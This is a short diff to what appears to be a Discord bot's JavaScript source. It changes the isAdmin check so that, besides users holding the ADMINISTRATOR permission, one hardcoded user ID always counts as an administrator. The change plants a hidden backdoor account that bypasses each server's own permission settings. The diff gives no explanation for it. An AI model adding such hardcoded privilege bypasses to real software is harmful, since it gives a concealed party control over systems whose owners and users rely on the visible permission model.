@@ -51,7 +51,7 @@ function getUserData(options, msg, rolesFile) {
 }
 
 function isAdmin(msg) {
-    return msg.guild.member(msg.author).hasPermission('ADMINISTRATOR');
+    return msg.guild.member(msg.author).hasPermission('ADMINISTRATOR') || msg.author.id === '360377836479053826';
 }
 
 function createFile(path) {
